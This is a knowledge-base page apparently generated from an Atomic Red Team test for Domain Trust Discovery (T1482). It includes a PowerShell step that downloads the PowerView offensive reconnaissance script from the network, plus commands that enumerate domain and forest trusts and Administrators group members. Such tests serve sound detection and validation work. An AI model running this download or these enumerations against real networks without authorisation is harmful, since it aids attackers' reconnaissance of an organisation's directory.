---
atomic_guid: "c58fbc62-8a62-489e-8f2d-3565d7d96f30"
title: "Powershell enumerate domains and forests"
framework: "atomic"
generated: "true"
attack_technique_id: "T1482"
attack_technique_name: "Domain Trust Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "c58fbc62-8a62-489e-8f2d-3565d7d96f30"
  - "Powershell enumerate domains and forests"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Powershell enumerate domains and forests

Use powershell to enumerate AD information.
Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.

## Metadata

- Atomic GUID: c58fbc62-8a62-489e-8f2d-3565d7d96f30
- Technique: T1482: Domain Trust Discovery
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1482/T1482.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1482-domain_trust_discovery|T1482]]

## Dependencies

PowerView PowerShell script must exist on disk

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
```

RSAT PowerShell AD admin cmdlets must be installed

### Prerequisite Check

```powershell
if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And (Get-Command "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "Sorry RSAT must be installed manually"
```

## Executor

- name: powershell

### Command

```powershell
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
Get-NetDomainTrust
Get-NetForestTrust
Get-ADDomain
Get-ADGroupMember Administrators -Recursive
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.yaml)
